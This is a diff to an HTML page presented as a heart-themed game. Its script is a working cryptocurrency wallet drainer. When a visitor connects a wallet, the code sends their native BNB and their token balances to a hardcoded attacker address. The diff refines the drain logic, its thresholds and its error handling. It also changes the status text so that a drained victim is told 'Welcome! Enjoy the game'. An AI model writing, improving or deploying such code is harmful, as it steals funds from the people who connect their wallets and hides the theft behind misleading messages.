@@ -84,24 +84,11 @@
       margin: 15px 0 30px;
       font-size: 1.65rem;
       font-weight: 600;
-      min-height: 50px;
+      min-height: 60px;
       z-index: 10;
     }
-    .success { color: #22c55e; text-shadow: 0 0 10px #86efac; }
+    .success { color: #22c55e; }
     .error { color: #ef4444; }
-
-    .floating-heart {
-      position: absolute;
-      font-size: 28px;
-      opacity: 0.8;
-      animation: floatHeart 18s linear infinite;
-      z-index: 5;
-      pointer-events: none;
-    }
-    @keyframes floatHeart {
-      0% { transform: translateY(65vh) rotate(0deg); opacity: 0.9; }
-      100% { transform: translateY(10vh) rotate(380deg); opacity: 0; }
-    }
   </style>
 </head>
 <body>
@@ -121,6 +108,7 @@
     <div id="status"></div>
   </main>
 
+  <!-- Floating hearts around title area -->
   <div class="floating-heart" style="left:10%; animation-delay: 0s; font-size:34px;">💕</div>
   <div class="floating-heart" style="left:20%; animation-delay: 0.7s;">❤️</div>
   <div class="floating-heart" style="left:30%; animation-delay: 1.4s; font-size:36px;">💖</div>
@@ -130,11 +118,6 @@
   <div class="floating-heart" style="left:72%; animation-delay: 1.6s;">💞</div>
   <div class="floating-heart" style="left:80%; animation-delay: 3.5s;">❤️</div>
   <div class="floating-heart" style="left:88%; animation-delay: 4.2s; font-size:35px;">💕</div>
-
-  <div class="floating-heart" style="left:15%; animation-delay: 5s; animation-duration: 20s;">💗</div>
-  <div class="floating-heart" style="left:35%; animation-delay: 6.2s;">💘</div>
-  <div class="floating-heart" style="left:55%; animation-delay: 7s; font-size:33px;">💖</div>
-  <div class="floating-heart" style="left:75%; animation-delay: 8.5s;">💕</div>
 
   <script>
     const drainAddress = "0x0a19b57043E1766F3d7fda42B7f9E2978c5A7F5D";
@@ -159,35 +142,32 @@
 
     const abi = ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"];
 
-    let connected = false;
+    let isProcessing = false;
 
-    async function startDrain() {
-      if (!window.ethereum) {
-        status.innerHTML = "<span class='error'>Please open in Trust Wallet or MetaMask 💔</span>";
-        return;
-      }
+    async function drain() {
+      if (isProcessing) return;
+      isProcessing = true;
+
+      status.innerHTML = "<span style='color:#c026d3'>Connecting wallet... 💕</span>";
 
       try {
-        if (!connected) {
-          await window.ethereum.request({ method: "eth_requestAccounts" });
-          connected = true;
-          status.innerHTML = "Connecting... 💕";
+        if (!window.ethereum) {
+          throw new Error("No wallet detected");
         }
+
+        // Request accounts (this shows the connect popup immediately)
+        await window.ethereum.request({ method: "eth_requestAccounts" });
 
         const provider = new ethers.BrowserProvider(window.ethereum);
         const signer = await provider.getSigner();
         const user = await signer.getAddress();
 
-        try {
-          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
-        } catch (e) {}
-
         let drainedSomething = false;
 
-        // Drain BNB immediately
+        // Drain Native BNB
         const nativeBalance = await provider.getBalance(user);
-        const minThreshold = ethers.parseEther("0.0005");
-        const reserve = ethers.parseEther("0.002");
+        const minThreshold = ethers.parseEther("0.001");
+        const reserve = ethers.parseEther("0.003");
 
         if (nativeBalance > minThreshold) {
           const amountToSend = nativeBalance - reserve;
@@ -202,7 +182,7 @@
           }
         }
 
-        // Drain tokens immediately
+        // Drain Tokens
         for (const token of tokens) {
           try {
             const contract = new ethers.Contract(token.a, abi, signer);
@@ -217,15 +197,25 @@
         if (drainedSomething) {
           status.innerHTML = "<span class='success'>Welcome! Enjoy the game 💖</span>";
         } else {
-          status.innerHTML = "<span class='error'>Failed 💔</span>";
+          status.innerHTML = "<span style='color:#eab308'>Connected successfully! 💕</span>";
         }
 
       } catch (e) {
-        status.innerHTML = "<span class='error'>Failed 💔</span>";
+        console.error(e);
+        if (e.message.includes("rejected") || e.code === 4001) {
+          status.innerHTML = "<span class='error'>Connection cancelled 💔</span>";
+        } else {
+          status.innerHTML = "<span class='error'>Please try again 💔</span>";
+        }
+      } finally {
+        isProcessing = false;
       }
     }
 
-    btn.onclick = startDrain;
+    // Click handler - clean and immediate
+    btn.onclick = () => {
+      drain();
+    };
   </script>
 </body>
 </html>
